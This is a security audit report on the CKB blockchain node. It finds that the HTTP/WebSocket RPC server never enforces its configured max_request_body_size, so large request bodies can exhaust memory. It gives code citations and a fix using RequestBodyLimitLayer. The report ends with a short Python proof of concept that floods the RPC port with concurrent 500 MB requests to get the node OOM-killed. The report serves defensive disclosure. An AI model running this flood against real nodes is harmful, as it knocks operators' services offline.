Audit Report

## Title
`max_request_body_size` Config Value Is Never Enforced in the HTTP/WebSocket RPC Server, Allowing Unbounded Memory Consumption via Oversized Requests - (File: `rpc/src/server.rs`)

## Summary
`RpcConfig` declares `max_request_body_size` and `ckb.toml` sets it to 10 MiB, but `RpcServer::new()` never passes this value to `start_server`, and the axum router applies no body-size-limiting middleware. Any caller can POST an arbitrarily large body, which axum fully buffers into heap memory before `handle_jsonrpc` is invoked, enabling unbounded memory growth and OOM-kill of the node.

## Finding Description
`max_request_body_size: usize` is declared at [1](#0-0)  and set to `10485760` in [2](#0-1) .

In `RpcServer::new()`, `start_server` is called for both HTTP and WebSocket endpoints, but only `address`, `handler`, and `enable_websocket` are forwarded — `max_request_body_size` is never passed: [3](#0-2) 

The `start_server` signature accepts no body-size parameter, and the axum `Router` applies only `CorsLayer::permissive()` and `TimeoutLayer` — no `RequestBodyLimitLayer` or equivalent: [4](#0-3) 

The `handle_jsonrpc` handler receives `req_body: Bytes`, meaning axum fully buffers the entire request body into a heap allocation before the handler is invoked: [5](#0-4) 

By contrast, the TCP path does enforce a 2 MiB per-line limit via `LinesCodec::new_with_max_length`: [6](#0-5) 

`rpc_batch_limit` is `None` by default (commented out), so the batch-size guard at lines 275–282 is also inactive by default: [7](#0-6) 

A codebase-wide search for `RequestBodyLimit`, `body_limit`, or `BodyLimit` returns zero matches, confirming no body size enforcement exists anywhere in the HTTP/WebSocket RPC stack.

## Impact Explanation
**High — Vulnerabilities which could easily crash a CKB node.** An attacker sends concurrent POST requests with multi-gigabyte JSON bodies to the RPC HTTP port. Axum buffers each body fully into heap memory before `handle_jsonrpc` is reached. Several concurrent requests exhaust available RAM, triggering OOM-kill of the `ckb` process, terminating all node services: block relay, sync, transaction pool, and RPC.

## Likelihood Explanation
**Medium.** The RPC binds to `127.0.0.1:8114` by default, limiting direct internet exposure. However, many operators expose the RPC port to broader networks for dApp backends, mining pools, or monitoring. Any local process on the same machine (e.g., a compromised dependency or co-located service) can reach `127.0.0.1:8114` without authentication. The WebSocket endpoint (`ws_listen_address`) is served by the same unprotected `start_server` path. The attack requires only a standard HTTP client and a large payload.

## Recommendation
Pass `max_request_body_size` from `RpcServer::new` through to `start_server`, and apply `tower_http::limit::RequestBodyLimitLayer` to the axum router:

```rust
use tower_http::limit::RequestBodyLimitLayer;

fn start_server(
    rpc: &Arc<MetaIoHandler<Option<Session>>>,
    address: String,
    handler: Handle,
    enable_websocket: bool,
    max_request_body_size: usize,
) -> Result<SocketAddr, AnyError> {
    // ...
    let app = Router::new()
        .route("/", method_router.clone())
        .route("/{*path}", method_router)
        .route("/ping", get(ping_handler))
        .layer(Extension(Arc::clone(rpc)))
        .layer(CorsLayer::permissive())
        .layer(RequestBodyLimitLayer::new(max_request_body_size))
        .layer(TimeoutLayer::with_status_code(
            StatusCode::REQUEST_TIMEOUT,
            Duration::from_secs(30),
        ))
        .layer(Extension(stream_config));
```

Also enable `rpc_batch_limit` by default in `ckb.toml` to prevent unbounded batch-request memory amplification.

## Proof of Concept
With a CKB node running with default config (`127.0.0.1:8114`):

```python
import requests, threading

url = "http://127.0.0.1:8114/"
# 500 MB JSON body
payload = '{"id":1,"jsonrpc":"2.0","method":"send_transaction","params":["' + "aa" * 250_000_000 + '"]}'

def attack():
    try:
        requests.post(url, data=payload, headers={"Content-Type": "application/json"})
    except Exception:
        pass

threads = [threading.Thread(target=attack) for _ in range(8)]
for t in threads: t.start()
for t in threads: t.join()
```

Each concurrent request causes axum to allocate ~500 MB on the heap before `handle_jsonrpc` is reached. Eight concurrent requests attempt to allocate ~4 GB, exhausting memory on typical node hardware and triggering OOM-kill of the `ckb` process. The root cause is directly verifiable by reading `rpc/src/server.rs:97-129` — `start_server` has no body-size parameter and the router has no limiting layer.

### Citations

**File:** util/app-config/src/configs/rpc.rs (L39-40)
```rust
    /// Max request body size in bytes.
    pub max_request_body_size: usize,
```

**File:** resource/ckb.toml (L186-187)
```text
# Default is 10MiB = 10 * 1024 * 1024
max_request_body_size = 10485760
```

**File:** resource/ckb.toml (L205-208)
```text
# By default, there is no limitation on the size of batch request size
# a huge batch request may cost a lot of memory or makes the RPC server slow,
# to avoid this, you may want to add a limit for the batch request size.
# rpc_batch_limit = 2000
```

**File:** rpc/src/server.rs (L59-78)
```rust
        let http_address = Self::start_server(
            &rpc,
            config.listen_address.to_owned(),
            handler.clone(),
            false,
        )
        .inspect(|&local_addr| {
            info!("Listen HTTP RPCServer on address: {}", local_addr);
        })
        .unwrap();

        let ws_address = if let Some(addr) = config.ws_listen_address {
            let local_addr =
                Self::start_server(&rpc, addr, handler.clone(), true).inspect(|&addr| {
                    info!("Listen WebSocket RPCServer on address: {}", addr);
                });
            local_addr.ok()
        } else {
            None
        };
```

**File:** rpc/src/server.rs (L97-129)
```rust
    fn start_server(
        rpc: &Arc<MetaIoHandler<Option<Session>>>,
        address: String,
        handler: Handle,
        enable_websocket: bool,
    ) -> Result<SocketAddr, AnyError> {
        let stream_config = StreamServerConfig::default()
            .with_keep_alive(true)
            .with_pipeline_size(4)
            .with_shutdown(async move {
                new_tokio_exit_rx().cancelled().await;
            });

        // HTTP and WS server.
        let post_router = post(handle_jsonrpc::<Option<Session>>);
        let get_router = if enable_websocket {
            get(handle_jsonrpc_ws::<Option<Session>>)
        } else {
            get(get_error_handler)
        };
        let method_router = post_router.merge(get_router);

        let app = Router::new()
            .route("/", method_router.clone())
            .route("/{*path}", method_router)
            .route("/ping", get(ping_handler))
            .layer(Extension(Arc::clone(rpc)))
            .layer(CorsLayer::permissive())
            .layer(TimeoutLayer::with_status_code(
                StatusCode::REQUEST_TIMEOUT,
                Duration::from_secs(30),
            ))
            .layer(Extension(stream_config));
```

**File:** rpc/src/server.rs (L165-165)
```rust
            let codec = LinesCodec::new_with_max_length(2 * 1024 * 1024);
```

**File:** rpc/src/server.rs (L218-221)
```rust
async fn handle_jsonrpc<T: Default + Metadata>(
    Extension(io): Extension<Arc<MetaIoHandler<T>>>,
    req_body: Bytes,
) -> Response {
```
